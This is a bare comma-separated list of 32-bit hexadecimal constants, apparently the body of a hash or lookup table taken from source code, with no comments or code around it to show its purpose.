0xE8D3A910, 0x63F66A0B, 0xE41E45C, 0x6BE3ACA8, 0x3B216749, 0xF6E7E92B, 0x3648960D, 0x24E53FD8, 0x629F866B, 0x58612465, 0x3330175B, 0xB6E15B23, 0xE54DD2C8, 0xE26D39A1, 0x45B60520, 0x68CDFA60, 0x6F60AB54, 0x98CE21D4, 0xF49D8A08, 0x80BC530D, 0xE2A11511, 0xE6587517, 0xC753412F, 0x3F1A5DAB, 0xC5C3B7F3, 0x8188935F, 0xFAE5D6F0, 0x284057F5, 0xD3F6C892, 0x6844C4B9, 0xF9D7A401, 0x8B52601F, 0xE6D85741, 0x4B3C9CA9, 0x812CBE0E, 0xA65F262A, 0x3E50AE92, 0x87871CE0, 0xB9827942, 0x144020FA, 0x9356E92F, 0x64C0273D, 0xB7374A66, 0xD0FC19F4, 0x501D7B4E, 0xA068C40B, 0x86913D37, 0x86913D37, 0x4626756C, 0x30822554, 0x16693C3A, 0xC6F43D0E, 0xBF25E7B2, 0xE7E1E32B, 0x680A34D4, 0xEF6FF47B, 0x8DBBB0B9, 0x72FF2E73, 0xAC8A5461, 0x3A0B8F9, 0xA791FCCD, 0x297AF6C8, 0xA5999031, 0x6B8F44FE, 0x8D5DF611, 0xEAF67377, 0xBB3C5A41, 0xC6384D32, 0xDD6A1E54, 0xE88B4BC2, 0x1226765A, 0x258CBA3A, 0x3E47F357, 0x43996428, 0xD5842BFF, 0x802FB686, 0x24ACC4E9, 0xFFD7476C, 0xC5EB849A, 0xA2CAAB4F, 0xC0047F15, 0x1A81202B, 0x52E111D7, 0x5C67725E, 0x1E6EC434, 0xCE87DA6F, 0x2B521F91, 0xEF72F533, 0xD8C3C1CD, 0xF290CFD8, 0x44253855, 0x7BFC66C6, 0xB6D610D, 0x1D99F676, 0x3DCF0092, 0xD1C3D71B, 0x8DE82C15, 0x4C8F02B4, 0xABBE1E45, 0x6AA6A1CC, 0xCA95C487, 0xC575F0BC, 0x40E25DB8, 0xAE92DD96, 0xB3496E1B, 0x62BABF2C, 0xB395D753, 0x5E4DF47B, 0x8444E1F0, 0x72BEE6DF, 0xFF545AD8, 0x41B0D022, 0x419DCDC4, 0xAB93F020, 0x35087963, 0x6F2626E1, 0x39ABB10E, 0x54E75C7D, 0x199DED14, 0x1A4318F7, 0xCE36E3FE, 0x334EFD46, 0x8A292AA3, 0x7A569F78, 0xF016E08F, 0xB6507AD9, 0xBDF458+3, 0x489FDD41, 0x49DF80+3, 0x60693CEE, 0xBC6C73CB, 0xB75D4AD2, 0x6253B9D7, 0xE319F90B, 0x5476B9FD, 0xF4F3C796, 0x7BFFE82F, 0x2C842D03, 0x728B4EF4, 0xA8DB435E, 0x7BF4A7D, 0xF3807BED, 0x18E3360A, 0x1EFFB02A, 0xB26FED2B, 0x22E9F555, 0x83B608A0, 0xE70D1F43, 0x60539BAB, 0x56AFCE6, 0xFB9BABF5, 0x40C59829, 0x7F93799B, 0xEEBDFE55, 0xDA0AF00E, 0xCF2E3E24, 0xC3DCBEDB, 0xFE485135, 0xE87CBE4C, 0xD9969E4, 0xB9C7FC2, 0xE991F733, 0xB8359952, 0x79A6CAF6, 0xC68D47C4, 0xD5BFCADB, 0x68DCAE10, 0x8D9A1734, 0x407C47FF, 0xD2161E77, 0xA41C3B62, 0x2F5F1D1, 0xD8D77733, 0xA4098ACC, 0x65B705F6, 0xE010F081, 0x5133A750, 0x20FD3E87, 0xDEC733E4, 0x742043F9, 0xB9632A91, 0x5E8E6F54, 0x308EDF6, 0x7FB6FB2A, 0xF07D8CEF, 0x827F14DE, 0x8EB83D2, 0x6214631F, 0x2B86F382, 0x31ABA127, 0xE8C8E535, 0xDB2D0762, 0x20871FD7, 0x95E1546E, 0x52746FE1, 0xBE27AA3F, 0xD15B46DA, 0x2F3A0D15, 0x80DCED6, 0x5BBCC934, 0xFE9A39F8, 0x10DE5150, 0x67649EE0, 0x9D2C94FA, 0xDFA36277, 0x45472FD5, 0x198F32D7, 0x93045157, 0x18B012B7, 0x97852A82, 0xB181F88F, 0xC969F2D0, 0xEFD2564A, 0xF5CD2AA4, 0x1A83A1B9, 0x3D081FE4, 0x60118951, 0x63959059, 0xD41DF479, 0x767DED29, 0xE1BC7485, 0xB01A5434, 0x7E3AA40A, 0x5777EC77, 0xF4418611, 0xEBB003F, 0xDBBCA06, 0x627A559B, 0xF11414C4, 0x939218AB, 0xCE5D53E4, 0xAB5B7C18, 0x42A55B14, 0xD217EE7E, 0x4C4C10CF, 0xBE699BDE, 0x2DB9EAB5, 0x749929D3, 0x94C834AD, 0x2F9A309C, 0xE4FD20D8, 0x13E7A5A9, 0x786CA0A2, 0xCBEC9369, 0x3F4AFB13, 0x2F28F0A6, 0x801D0D86, 0x317775DF, 0x317775DF, 0xB07DAF98, 0x33D6868F, 0x1DCD878E, 0xD86A029E, 0x7F349900, 0x630CD8EE, 0x81E1AD32, 0xD3600591, 0x92B35BE6, 0xC85C4487, 0x92F50134, 0x3C4CF4D9, 0x2DFD35C7, 0xA89336C, 0xC84BE309, 0x9FE8FD5E, 0x29046C+2, 0xC51BC42F, 0x16D7AF8+1, 0x15B24768, 0x6C67131A, 0x11D09737, 0xD3BF3ABD, 0xC06B763D, 0xB9392CE7, 0x92DAFA78, 0x22CA9F2A, 0xDA7951A2, 0x7D95AFFF, 0x96863460, 0x8543AAC8, 0x6025AA2F, 0x30D72A4B, 0x46794EB2, 0x4370999E, 0xD6CC4766, 0x51972B04, 0xD43BB56D, 0x28058ACF, 0x2AD2C9CE, 0x92593632, 0x127310EB, 0x8F45D327, 0x19FCBBB2, 0x850690FF, 0x9D4934F4, 0x57218529, 0x5F86AA39, 0x7AD67C95, 0xD4DA14EF, 0xFF06772A, 0x96C4C4DD, 0x3BE1257F, 0xD8E31B1A, 0x872C2CFB, 0xFFDF46F0, 0xF9DC2AF7, 0x6349065, 0xCA52CF43, 0xD439C692, 0x35A8AE60, 0x96E7AD87, 0xD56C3D52, 0x21645D0A, 0x30572945, 0x8D7E3A7D, 0xBDD9FA57, 0xBBE6ACC9, 0x4072CD06, 0x291C3B23, 0xBC4AA502, 0x781C7E80, 0x6A79782A, 0xD12E5B5D, 0x718D461F, 0x75885CB3, 0x9D6376F, 0x7D8F26A1, 0x55226C13, 0x39C0B635, 0x7DDADB92, 0x10BD4435, 0xE4ACF8C3, 0x91EA80EF, 0x5C644614, 0xE645E162, 0xD79803B5, 0x1F6B4B13, 0xE9529CC, 0x4FF3D3F5, 0x617DC75D, 0xA83C3D15, 0xA17FBF37, 0xA2A73564, 0x3ADA414E, 0xFCFF792A, 0xE1EF6450, 0x96525B06, 0x11718507, 0x7762249C, 0x7ED33DC1, 0xC80A5DDF, 0xDBA768A1, 0x39A3CC6F, 0x9A29ACE6, 0x1F375B4C, 0x93ADEA5, 0x81F34C71, 0x34E735A6, 0x18B17C80, 0x5EF9C5C2, 0xFC227584, 0xA113B2C, 0x83CE1A4C, 0xD201FC29, 0x6B0FE61B, 0xA9565228, 0x2B31F41A, 0x3F712874, 0xD4B9730, 0x919A4858, 0x106C8317, 0xD87F3A9E, 0xC0B971EA, 0x94BCAC7C, 0x7D90EEE5, 0x734CFEDA, 0x8C227332, 0x5C350D78, 0x9451EFE7, 0x4E9CA30A, 0x11A178B8, 0xDB3FEB5C, 0xA7F84694, 0x57592D52, 0x95115F97, 0xA77F31E8, 0x794CC92C, 0x8B2DE971, 0xE77199F7, 0xE23416C1, 0xA8171E9E, 0x353E8056, 0x250ADA61, 0x99CB167F, 0xC6C04C75, 0xC869FE97, 0x361E9EAC, 0x386F0D25, 0xE7AA1BC9, 0x6AB757D8, 0x9A5C1D56, 0x5CA74040, 0xD9082BB5, 0x7740EA4E, 0x625181DC, 0xBEBBFDC8, 0x6926AB03, 0xD447439D, 0x584E9C59, 0x5656D578, 0xDE40C28, 0x98C9138B, 0xFB1A9CDE, 0x1C0CAE89, 0x4671AC2E, 0xDA02F415, 0x5F3DDEC0, 0x63A89684, 0xC6294698, 0x45705F94, 0x98F0F3C, 0x381AEEE9, 0x89499A0D, 0xC9F67F28, 0x1B09184F, 0xDF38165E, 0xAA10752D, 0x8727A4C5, 0x96B2FD08, 0xED88FC61, 0xC9FA6E07, 0x2D7787BC, 0xA4EA0691, 0x96374262, 0xB477A015, 0x562C4D0, 0x4051115B, 0xA1BFD5E0, 0x64D91CED, 0x998E5CAD, 0xF4038776, 0xD320CE5E, 0x7A03CC8E, 0x2508AC81, 0xF698765E, 0xDBF75E58, 0xD209D52B, 0x89459F0A, 0xCAECF37E, 0xC6CC812C, 0x4EFE7E6B, 0x8BC9E618, 0x98EFF6F1, 0x87B92190, 0xC013972F, 0x452E8D9E, 0xC161558D, 0x854E9AB8, 0x20E4FFD9, 0x63320F3C, 0xF11A3018, 0xBB720FE7, 0x25BE7FA8, 0x95C53824, 0x18DB5434, 0xF5CCF164, 0x39771F21, 0xEC2A0ECF, 0x75B06B5A, 0x2569C9A7, 0x9F861FD4, 0x878486CE, 0x4F3E3104, 0x9F49C72, 0xE96C29FE, 0xA280324, 0x296574AE, 0xDA13A4B6, 0xC9F6F0BC, 0xCB074B9D, 0xACDE6985, 0x6E00EB0B, 0x39C1849A, 0xC3240BB4, 0x47436C12, 0xC4D71AB4, 0x54C44B1A, 0xA8546914, 0x36F75399, 0x78350773, 0x5A45B11A, 0x17F4F44D, 0x81216EE0, 0xCB570185, 0xC58250F1, 0x50C39926, 0x710E5D1E, 0xC7BD1AF0, 0x22BE2423, 0xC47DFF02, 0xF62B3C48, 0x3589452B, 0x144AAF22, 0x40CE4DFD, 0xCB7415AC, 0x52ACCB7B, 0xCCDC33CC, 0x91ABB8E0, 0x85B1C9FA, 0x22A430, 0x902E26AC, 0x20AB0B6B, 0x82BA6F2, 0x348B9046, 0x53A95E13, 0x7605EF6F, 0x5C3BF51B, 0x761BE00B, 0xBAF17315, 0xD374BEBC, 0x877C0BC5, 0xFE25A58F, 0xB44677C5, 0xAF6F6E0B, 0x483715C, 0x78E1A557, 0x2B73BCF6, 0xD1AE2681, 0xBE81F1E2, 0x1A40454B, 0x6BDE5CE4, 0x507BC6F7, 0xE2DB58F7, 0xB54F46CA, 0xAB73ED26, 0x902BC7D9, 0x2C2618CC, 0x40282018, 0x46FB06A5, 0x24005CC8, 0x4C0D5303, 0x4D5D9EE3, 0x944BA1DC, 0x8E71E00F, 0x42E9F2CA, 0x590A8160, 0x32094719, 0xCA03A1E5, 0xB630E5FF, 0xB9B7E777, 0x840CB5DA, 0x9D1E7785, 0x644C9FA4, 0x3C806A2D, 0xF477D0B1, 0xF477D0B1, 0x6F9BA2, 0x495BE324, 0xF43D9821, 0x8230FF6C, 0xA0C3CE29, 0xD06F1720, 0xFF6191E1, 0x721B2492, 0xE202879D, 0x8FF6232C, 0x72C20700, 0x6F203C6E, 0x2D833F4A, 0x881A694D, 0x3B1C07C8, 0x9EF0BC64, 0xB930956F, 0x9B38374A, 0xDB06F7AD, 0x5417E0E0, 0x284352C4, 0xE2089749, 0xF91B8C33, 0x74E8FAD9, 0x6B4335DD, 0xFB45728E, 0xC2624A28, 0x893A342C, 0xCAD8217, 0xB710A51, 0xE0F0684F, 0x3CE5BF6B, 0xFC5FF7B3, 0xBBC35B03, 0x212BD0DC, 0x31FD0BA4, 0x242D88E, 0x1F38102E, 0x71AEFD77, 0x42BF09B3, 0xE933B34A, 0xFBDBE374, 0xCE4A3D20, 0xD2B7A5A0, 0x92E7E4EB, 0xBD3F9EC, 0x4A947BA, 0xC20A7D2B, 0x8501E727, 0x1A332D2D, 0xC8865DF, 0x49F977A9, 0x6F009E33, 0xDA65ECAA, 0x6283BE32, 0x1479E85A, 0xABADB709, 0x1C996BCD, 0xF557BAF9, 0x8C913A91, 0xA8D2FB92, 0x9A17F835, 0xE0C9307E, 0xA0D8C749, 0x24A4E0B2, 0x66C3C59C, 0xD9660339, 0xD2688412, 0xAD99F2CE, 0x23D0A1CE, 0x44828FB3, 0x196444BB, 0x3301EA47, 0x42B484ED, 0x8F60366E, 0x2EAFA1D1, 0x7C18FC8A, 0x96663D56, 0x86745EF3, 0xC3C10FCC, 0x54EC103, 0x46B5A15C, 0x5D209F25, 0x2D33F15A, 0xDF99925C, 0xA27F4472, 0x7FF553F, 0x55294368, 0x66DA9935, 0xA9F7E9C3, 0x63F093A6, 0x19F0C471, 0xC6047FDB, 0x4ED71C1A, 0xA27B9FE8, 0x7C92F21, 0x8474E6F0, 0xE3802533, 0x334B9364, 0xC4CD928D, 0x70A0ED62, 0x33C20BC4, 0x30B3EC0A, 0xEAF04923, 0xA0F7F07C, 0xB6997FC, 0xBB293400, 0x2BEFB6C4, 0x127F2DAE, 0xF11FC458, 0xE6B90E9C, 0x9BE4F7E1, 0x866004A8, 0xCC068380, 0x5A3733CC, 0xF803589D, 0x96B8BEE8, 0xAB6BD72F, 0xA14CC95D, 0xBEE23713, 0x5AA379D9, 0xA07B6368, 0x1F3DB3E3, 0xBE70849B, 0x451A2644, 0x224A3488, 0xF8A07513, 0x8957038E, 0x832150E5, 0x40470683, 0x2AD2EC51, 0x47547D4, 0x4B643076, 0xCB89CBE0, 0x7D479AAB, 0xC0AB03EB, 0x27EEBCAB, 0xB241CABD, 0xDE7D398C, 0x87BD1D11, 0xE792C4A5, 0xE6AAA0D5, 0x99CF02C4, 0xE7CB4F95, 0x20DDCF2F, 0x2F7836E2, 0x8283E028, 0x1100CAF5, 0xAE7FF044, 0x1B3803B1, 0x7E97C92C, 0xF02E92D7, 0x78436D07, 0x5AEE2FC1, 0x4E665BB2, 0x1A89B5FC, 0x3401FC96, 0x54198922, 0xBD64F1B7, 0xC5D8B1E9, 0x6F1C592C, 0x3D96A21C, 0x2E51C61C, 0xD57A5125, 0xF4287778, 0xF64DF4CF, 0xD9622D64, 0x468CC978, 0x16184FB5, 0x4F5B781C, 0xADF8F882, 0xF1EDB7F4, 0x56485B56, 0xC1A11435, 0xAA7EA3BD, 0x7D4FD28C, 0xEA2188C, 0xABED6020, 0xCA23FD25, 0xC670C814, 0x3461981, 0x41F5F10E, 0xA9021211, 0x8B755993, 0x8F266745, 0x531E4892, 0xB96C7ABE, 0xAF83036, 0x1F321943, 0x881B1FDB, 0xC2169164, 0x11427401, 0x3BD3F458, 0xF79A97F5, 0xF69B729C, 0xAE63B1C2, 0x5E854D47, 0x517B601B, 0x6087C10C, 0x469A61CF, 0x8BF60FC3, 0xC65586A9, 0xADD0B40F, 0x6E5BDCE2, 0x3FB40673, 0xBDC8F63E, 0xC7FF5AFC, 0x66EC713F, 0x358D1D77, 0xE46AC10F, 0xEF63BFDF, 0x1F88819D, 0x2D817A5E, 0xBB54AA3D, 0xA79E5B05, 0xEB864288, 0xAB07CBBE, 0x60E1FEDF, 0x87D79A04, 0x96E28FE2, 0xA520B982, 0x5518C0F, 0x4A23B9C9, 0x543CD2BE, 0x4E53202A, 0xD7624E6B, 0x3F75CC38, 0x6716460F, 0x8AC9EA19, 0x26864403, 0x56E75FE4, 0xA95299B9, 0x3D2C1916, 0xDB67785D, 0xBCACBEA2, 0x1E20138A, 0x8A559D26, 0x6CDAA7D2, 0xBF21818E, 0x3C3E2AB6, 0x5F29A7E0, 0x36EAD960, 0x5BE529F7, 0x454C7B67, 0xE5961511, 0xAE396263, 0x913FD7D6, 0xB3D9A67F, 0x6CC062FC, 0x57F9BC83, 0xF3768F90, 0xEC62629, 0x5E557307, 0x74E8C53E, 0x959E43A3, 0x7771AB83, 0xA13045D4, 0xA6DAA79F, 0xBEDC4503, 0xF4B80C7E, 0xA08C9141, 0x6AA9A154, 0x42BD0780, 0xBEB98840, 0x8029970, 0xC871E745, 0xB5ABC4B4, 0x3F7EDBBD, 0x3D6360B5, 0x20317535, 0x3FD49D3B, 0xC207D6E, 0xFBBAC350, 0x907A6BF, 0x6A0BEA60, 0xE9C6B3FD, 0x3EA9D44C, 0x9374523F, 0x323DC78C, 0xD156FD1A, 0x8AB4890B, 0x32B7A076, 0xFCE995D, 0xA639DCA2, 0x70ED476A, 0x50507BED, 0xF3B1CA85, 0xC692F86A, 0x9B88E3E, 0x715CB8C4, 0x4BC4105E, 0x9D854A37, 0x8592152D, 0xE1FCCDBA, 0x7017257D, 0x4977AC28, 0xE6EEF8AF, 0x6BB93227, 0xE642F2FD, 0x345C2980, 0xE566C7DA, 0x9DFD89E6, 0x75321B5, 0x6EFC2FD0, 0x60AA4AA1, 0x132CA01E, 0xAFFEA720, 0xFC9AD060, 0xAF329720, 0x4CB2AB4, 0x74E0BC0A, 0x31F951FD, 0x58F1DF7D, 0x146764FB, 0x2FF65C0B, 0x47D61C99, 0x5CE60A11, 0xD7E5CF9, 0x157D44D3, 0x36A5F2DA, 0x95FFACF8, 0xB97A966B, 0x63DC4A5, 0x104DDE8D, 0x7EF353E1, 0xF60986FC, 0x1DD01FE7, 0x8BB336F7, 0x5332E645, 0x17F1C69D, 0x3A3599B7, 0xE3570BA2, 0x8D014B23, 0xB59D74CA, 0x1B2114D2, 0x58AFBE63, 0xC7CB8ADF, 0xAD13375E, 0x17146B2B, 0x31F19263, 0xCEE79711, 0xE0C28DB5, 0x468B0884, 0x3383F57, 0xC0900BC, 0xE2854C4, 0x73098D40, 0xC3CDB626, 0x7917E111, 0xA357A2C6, 0x8262C70E, 0x4F4BB300, 0xC71E607B, 0x82D32D07, 0xC901AA9F, 0x4AF0ADF5, 0xF637166E, 0xCCA9C022, 0x1E5F6AEF, 0x532DDD2, 0x4ABD1E59, 0xCDEBCCE7, 0xB054EC4B, 0x4F41DF6B, 0xF26CDC, 0x577DAA8A, 0x18F03AFD, 0x8B99B72B, 0x877C0E1C, 0x5E832444, 0x3FDA00F3, 0xE5DA4CED, 0x93C665FA, 0xD50DF46C, 0x19EC65D9, 0xB2451429, 0xC5E0C989, 0xA4302183, 0x51B2D848, 0x4677C656, 0xF5E3401C, 0x7D593B4C, 0xE96CFE7D, 0xAB969F00, 0x3242F952, 0x9773F36A, 0xFDE84CB7, 0xF7134E73, 0xC47352E7, 0x52FB8074, 0xEC651BC0, 0xF6F9D1B9, 0x72BA00CE, 0xFD95899E, 0x808D4CC, 0x11378777, 0x13301529, 0xCE40F423, 0xB8DF604E, 0xF49C1533, 0x3624F054, 0xA812B6CB, 0xF30E5814, 0xC6609191, 0x51367B34, 0xF9D7D67D, 0x1D0C929D, 0x9156EFC0, 0x8FA6EE0E, 0x7F70C15A, 0x4FD83F5B, 0x8179C48A, 0x41702C8A, 0x208DD848, 0xF9B6426D, 0xA51DC214, 0x1720ABA6, 0xA19708E3, 0xF9A51B92, 0x4C2C6B6A, 0x4818ACD0, 0x470810ED, 0xD9BF6549, 0xCCD8C02D, 0x3E25A3C5, 0x2BE9235A, 0xDAF3B0AE, 0xBE3D32B4, 0xA71A1D2A, 0xB739F53, 0xBE1C1506, 0xC4D91094, 0x40DBF464, 0xF7952E62, 0x168EE2C2, 0xF4F13B06, 0x4E2C348B, 0x43657B17, 0xB08B6992, 0x6970BA94, 0x89EA7B54, 0x9C95D0BB, 0x3083FAD7, 0x4A65250C, 0x8F7D9F46, 0xDB8B5D71, 0xCEA55F4C, 0x8DCFE77D, 0x331D9A27, 0x9C35A221, 0x907498B0, 0x4FCA6436, 0x28A45454, 0xA7E7E04F, 0xF1F9D4B4, 0xFEA9B85C, 0x8DE13B36, 0x8D27280E, 0xB72F086D, 0xEDA68956, 0x9E35DAB6, 0x5B912C3F, 0xD7F934F4, 0x813353ED, 0x31A630A4, 0x5C645F64, 0xB8D2C99E, 0x1E2E3177, 0x9262A60A, 0x92E77D21, 0xA05FEBD7, 0xF60DAAF6, 0x5FD794+3, 0xF7784FC8, 0x136326EC, 0xD14D9C07, 0xF17634EB, 0x86A0B759, 0x1E05F29F, 0x7E02FAEA, 0x87717DD4, 0x27AA14D8, 0x5E149683, 0x8023B16, 0x74C2C1B7, 0x9BFC9FE2, 0xD3498917, 0xF8D7AF3B, 0x5AC9F04D, 0x3B0BB3A3, 0xEBA00C2A, 0xF000828E, 0x89C2B5EA, 0xA18A1B26, 0x45975AE3, 0xF0996C6E, 0x2E96EF1E, 0x62EF0A63, 0x59127716, 0xF00A20B0, 0xEE4D173E, 0xCE48F260, 0x4EC0D983, 0xF6659045, 0xD265B049, 0x95481343, 0x48171BC, 0xA396ACDE, 0x97420B6D, 0xE0A42430, 0xC54365C2, 0x400BDDD9, 0x2DA4C282, 0x5C85FF81, 0xBB7EC8C4, 0x20E5B3EE, 0x94AE7172, 0x76A9FEB6, 0xB802B671, 0x9E68F0+3, 0x5C0AB2A9, 0x9A176B6E, 0xA7DC5657, 0x5C05B7E1, 0xAC00A5BE, 0xD036DA4A, 0x99B58DBC, 0xD05EB7F6, 0x1B4044+2, 0x7685B333, 0x3FDCC8D7, 0xD19B312C, 0xDA9FD9DB, 0x451FB6B6, 0x7A21050E, 0xE128F2B0, 0xAE4F4560, 0x953EF45E, 0xF2F67014, 0x67555C66, 0x19991ADD, 0x5829E504, 0x8011247F, 0x1A3EA6CD, 0xCAB21090, 0x3813019A, 0x5888F58E, 0xC8CC9E75, 0xA0FD42D3, 0xC9DDA85B, 0xE5219410, 0xD33AFF79, 0x4FFEFE43, 0x74EE2D8B, 0x6C344AE3, 0x2F98B405, 0x95F1C60D, 0x1BCD3DDF, 0x3974879F, 0x9ECF722A, 0xF1E84832, 0x7F9B9052, 0x7BBEA8CF, 0xE797A4B6, 0x92268BB5, 0x92B7351C, 0x6BAF95FA, 0x932A6CED, 0x17E6774+3, 0xE1F86C6A, 0xBE6A30C3, 0x22E03AD0, 0xCEAE5AFC, 0xF5F4BD95, 0xAB8319A3, 0x6EE4A282, 0x54E79E9C, 0xF633805A, 0x807B3450, 0x3369DD1F, 0x8E8CB520, 0x1FDB590F, 0x83ED8E08, 0x40202867, 0x25924010, 0x48914F6A, 0xCDC4A590, 0x79C916C5, 0xBDA90BAC, 0x8E952B12, 0x966C90FD, 0xBA672146, 0x7963FA4D, 0x88B13CDC, 0xD6E3D5EA, 0xE22445DA, 0x455DDF5C, 0x89DB0EC7, 0xA4EF02F3, 0x68A054E, 0x9B8631EB, 0x47C8E5FF, 0x68D486B2, 0x4D15FDB1, 0xDE8C0DB8, 0x9CBC4B0, 0x199E75EF, 0xFD0F7EDD, 0xAE4E14+3, 0xEA5176C0, 0x59F3479B, 0x764F6222, 0x324B56DB, 0x18227209, 0xBA2BB4B4, 0x8FA7CEBD, 0x47EDEE56, 0x9B9FCD02, 0x65C597B, 0xB5087ACF, 0xE0A619BD, 0xDBFB067B, 0x51ADCC5F, 0x235A57B3, 0x597063BA, 0x95D07BA5, 0x23C5274E, 0xE9FCFB32, 0x391DF4F3, 0x54998C37, 0x5062875E, 0x7F85DFDE, 0xCCAA5CE9, 0x818B6830, 0x83794008, 0x16A80CD6, 0x6C25975C, 0xA9A308F3, 0x603FA104, 0xD8FEC4F8, 0x20527695, 0x8687E285, 0x744AC008, 0xC3A12135, 0x6A036061, 0x998103C2, 0x98AA48E5, 0x4538C4A2, 0x2E079AE6, 0x50EF8FC6, 0xBBB6DF61, 0x8B4D1C06, 0x5666A837, 0x8218944E, 0xF2FDF2E0, 0xBB7CCE49, 0x5C4C8458, 0x54058F5F, 0xA7E36020, 0x64235620, 0x3EAD9DB8, 0x8434CB43, 0x4BB33316, 0x56F961E4, 0x2C30912D, 0xEA235081, 0x4DD46DAE, 0xB06FE3FE, 0xB386713E, 0x10DD636C, 0xBFFE8B5C, 0x3FE5B222, 0xA9DFDC40, 0x97B1CDF6, 0x16AED87B, 0xC3AA2EC7, 0x679CE71, 0xC62E77B3, 0x74D6B13C, 0x90700C7D, 0x44BFB619, 0xDDFE9FBC, 0x3287FD2, 0x408A9436, 0xFFB2ADA1, 0xBA57E53E, 0x34DD7B28, 0x755A2B3E, 0xA003C40B, 0x5E1020CC, 0xE66A0B40, 0x72052DB3, 0xB0313590, 0xC077BCD6, 0xC4AEAF49, 0x2465296D, 0xEB69FB0C, 0x51030E5B, 0xCD69BEA1, 0x4C2C2B12, 0xEAB97F25, 0x69956127, 0xCB1CD6D3, 0xC6D53AA0, 0x155465EE, 0x98EFB921, 0x29532731, 0x20AB933A, 0xD760CAD5, 0x47978D7F, 0x231CFD12, 0x9FCE9C9A, 0xE4B3726A, 0x41E8912A, 0x8A04E1FE, 0x25915CB9, 0xB2E83B75, 0x3972551F, 0x18867C61, 0x5B6A607E, 0x7591E516, 0x8AFE3D90, 0x239C1D4E, 0xA657DD2, 0xD10E761A, 0xA78571CA, 0x53BB329, 0x3914463F, 0x17CBC608, 0xBFAA349B, 0xBEB7281A, 0xE1B38AE, 0x955B31BF, 0xBC54371B, 0x644141C5, 0x9F82917F, 0x5A74E873, 0x38BC35C8, 0x53C9563C, 0x6B97075B, 0x94AB35A9, 0x7B2A0337, 0x99F58A07, 0x965EA007, 0xEEFC8A55, 0x866D1B67, 0xED4A272F, 0x4ACF110C, 0x1AA3A0D5, 0x37877757, 0x1CF89DA5, 0x16E53875, 0x365C50EE, 0x25E2DBA9, 0xC1F6443B, 0x1FDC75DC, 0xCA7A0A49, 0x44A58B0A, 0xD32FA11F, 0xA7FA70AE, 0xCC7DCE24, 0x70F6D3AD, 0xD59A822B, 0x2B7B57B3, 0xBAF52DD8, 0x9B9AFFF1, 0xC38E9DB0, 0x32A4EB22, 0x9262744C, 0x8243B79, 0x798D6C27, 0xE69E8D0D, 0x742075FE, 0xCE569932, 0x82146BE9, 0x133FF2D5, 0xCBA7242F, 0xDED82A6E, 0x47B3C35E, 0x40CF0783, 0x4609D596, 0x4C2C0D1F, 0x9EFBD5D1, 0xA6D8B798, 0x67E74842, 0xE123C7AC, 0x22C33603, 0x37F5BD93, 0x1CFB3F51, 0x87D1E6BD, 0x87D1E6BD, 0x4908A514, 0x50296140, 0x3970B0DA, 0xC1487110, 0xCC2356E3, 0x2DE69817, 0x81BD8D3B, 0x8E1D8F78, 0xD35DD93, 0x8F3137E6, 0xB9137BA7, 0x9FEEAA9C, 0x5E8A7559, 0x331AEABF, 0xE5E8E5C, 0xA5A0C695, 0x91534C6E, 0x744A9EA5, 0xA19A238D, 0xFF7D44E6, 0xA2C5BD9D, 0xA850DDE1, 0x8F6754AE, 0x1E34953F, 0x771FE190, 0x3276D9D3, 0x41A0FB02, 0x11DC0F27, 0xDEB3F5A, 0x84315226, 0x38FC2EEB, 0x1C4F9FDB, 0xA69AE16C, 0xF50BC67A, 0xB3BBD241, 0x70A2845C, 0x346B506C, 0x95DB70+1, 0xAD334B40, 0x980D45D7, 0x48CCC328, 0x8E664EFD, 0x611E0BE2, 0xF0211AC1, 0x1F0DD8AF, 0x405ECA16, 0x9567392B, 0xF79FFF3C, 0xA7F3F82B, 0x410C61D1, 0xD4F845D, 0xE13C1F7F, 0x213C6D36, 0x511E6F50, 0xB4668B23, 0x30B51753, 0x2DAD93F, 0x2D947814, 0x37A28C26, 0x11E8B5CD, 0x429AEAB3, 0xAD546CC3, 0x1856D008, 0x68C9AF69, 0xEE8D9E70, 0xE4547765, 0xA40EF65A, 0x3225BA3, 0x4DEBC227, 0x5C065D55, 0xCA1167F, 0x424C6E27, 0xD3BBE42F, 0xBDBB5948, 0x97287D68, 0xC6EA802E, 0xFD261E30, 0x8570DD34, 0x273C6180, 0x371BBA08, 0xA100CC97, 0xBB2D33D3, 0xFCBD557, 0x1739DAC2, 0x2F7AA05C, 0x58040420, 0xD6EF9DA7, 0x8F95A20B, 0x63BFA7A0, 0x3F88CD86, 0x483C5C88, 0x45619B33, 0xFE21F891, 0x6FC0353D, 0x7DB578DD, 0x87A42A12, 0x65213FC3, 0x38C951A4, 0x4B44A83D, 0x4E0A260B, 0x9D2D778D, 0x253284+2, 0xDF83DB47, 0xD42A41C2, 0xD649B7E1, 0x4F44AF21, 0x47531446, 0x34883DE3, 0xB74C3BD7, 0xB4A9A558, 0xECE58AE0, 0xF736227C, 0x5AFCD8A1, 0x48659CD7, 0x9BF33E41, 0xF592AD10, 0xAB0F06BE, 0x17FF9393, 0xE9AE494F, 0xA8B37DEA, 0xC33ED360, 0x41924877, 0x4BD59750, 0x7B44D659, 0x142C8F76, 0x95A9AB2B, 0xA565E27E, 0x43BB7E48, 0x6158959E, 0x23FF2BA4, 0x73BCFFDC, 0x19B17769, 0xE8D11C58, 0xF0B330AD, 0x3E263AE1, 0xE9E46941, 0x50A62C43, 0xE3261B35, 0x1E82C2AE, 0x46D06B9A, 0xF4FD8AE4, 0xF4A1A14A, 0xAF016CC1, 0x3A68AA46, 0xA286DE96, 0x21F51560, 0xF1B8817A, 0xE08C834D, 0xE08C834D, 0x5E14DF68, 0xF015BFE2, 0x17B99CE7, 0xE51B4C5A, 0x8C886BE5, 0x56A02502, 0x184F6AB3, 0x1D094562, 0x1F63B042, 0x7EFBA039, 0xA3CDF152, 0x618B5F67, 0xC2E1E2C5, 0x40062C53, 0xBE5CCED, 0x64A7A0E0, 0x36C9A5EA, 0x9C6DA0B3, 0xE0B32108, 0x6052E62E, 0x93D23399, 0xF0E94FF, 0xF139681B, 0xAB11267D, 0x7FADB4B9, 0x3A8F1BF7, 0x77687DC5, 0xCBB5F9B6, 0x276A7807, 0xE92DC, 0x9879AC51, 0xDB18FA01, 0xA7E936FD, 0xB241806C, 0xD1BAAFB7, 0x63B02FAD, 0x132B6D92, 0xEDD01937, 0x883DAB2D, 0x6AE36192, 0x3DA41C1A, 0x2048A7DD, 0x482B28D0, 0x9174AF84, 0x517A4384, 0x1F91A06E, 0x4487F579, 0x2314444B, 0xC526F3C6, 0x5DE226A5, 0xC49343BB, 0x32A93544, 0xEE6ABD32, 0xD6A679E1, 0x66FF4FAA, 0xF2A65A4C, 0xE8EF929, 0x3551727A, 0x3EE71F6A, 